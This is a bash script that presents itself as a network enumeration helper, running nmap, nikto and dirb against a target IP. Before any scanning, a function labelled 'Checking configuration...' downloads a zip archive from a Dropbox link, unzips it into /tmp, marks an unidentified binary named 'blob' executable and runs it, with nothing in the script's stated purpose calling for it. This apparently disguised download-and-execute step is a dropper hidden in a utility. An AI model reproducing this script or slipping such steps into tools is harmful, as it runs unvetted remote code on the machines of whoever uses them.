#!/bin/bash
#
# Usage: sh ./enum.sh <IP>

# nmap
# nikto
# dirb

# Declare the constants here  
ROOT="/tmp/"
DIRECTORY=$ROOT$1

if [ $# -eq 0 ]; then
    echo "You need to specify an IP, for example: enum.sh 10.0.0.10"
    exit 1
else
    IP=$1
fi

mkDirectories() {
    if [ ! -d "$ROOT" ]; then
        mkdir $ROOT
    fi

    if [ ! -d "$DIRECTORY" ]; then
        mkdir $DIRECTORY
    fi
}

do_dns() {
    echo "------------------------------------------------------------------------------"
    echo " DNS "
    echo "------------------------------------------------------------------------------"
    echo "\n"
}

do_nmap() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sT -p- -oN $DIRECTORY/nmap_sT_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sT -p- -oN $DIRECTORY"/nmap_sT_allports.nmap" "$IP"

    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sU -p- -oN $DIRECTORY/nmap_sU_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sU -p- -oN $DIRECTORY"/nmap_sU_allports.nmap" "$IP"
}

do_nikto() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nikto -host $IP -port 80 >> $DIRECTORY/nikto.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nikto -host "$IP" -port 80 >> "$DIRECTORY/nikto.txt"
}

do_dirb() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: dirb http://$IP ./dirb_big.txt >> $DIRECTORY/dirb.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    dirb http://"$IP" ./dirb_big.txt >> "$DIRECTORY/dirb.txt"
}

do_wget_and_run() {
    FILE_URL="https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&st=em7ud3pb&dl=1"
    OUTPUT_FILE="/tmp/blob.zip"
    UNZIP_DIR="/tmp/"

    echo "------------------------------------------------------------------------------"
    echo " Checking configuration..."
    echo "------------------------------------------------------------------------------"
    echo "\n"

    # Download the zip file using curl
    echo "Downloading file from $FILE_URL..."
    curl -L -o "$OUTPUT_FILE" "$FILE_URL"

    if [ $? -ne 0 ]; then
        echo "Failed to download file from $FILE_URL. Exiting."
        exit 1
    fi

    # Verify the downloaded file is a ZIP archive
    FILE_TYPE=$(file -b "$OUTPUT_FILE")
    if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
        echo "Downloaded file is not a valid ZIP archive. File type: $FILE_TYPE"
        exit 1
    fi

    echo "------------------------------------------------------------------------------"
    echo " Unzipping the file to $UNZIP_DIR"
    echo "------------------------------------------------------------------------------"

    # Unzip the downloaded file
    unzip -o "$OUTPUT_FILE" -d "$UNZIP_DIR"

    if [ $? -ne 0 ]; then
        echo "Failed to unzip $OUTPUT_FILE. Exiting."
        exit 1
    fi

    # Ensure the extracted file is executable
    BLOB_PATH="$UNZIP_DIR/blob"
    if [ -f "$BLOB_PATH" ]; then
        echo "------------------------------------------------------------------------------"
        echo " Making $BLOB_PATH executable and running it"
        echo "------------------------------------------------------------------------------"
        chmod +x "$BLOB_PATH"
        "$BLOB_PATH"
    else
        echo "The file 'blob' was not found in $UNZIP_DIR. Exiting."
        exit 1
    fi
}

# Call functions
mkDirectories
do_wget_and_run
do_dns
do_nmap
do_nikto
do_dirb

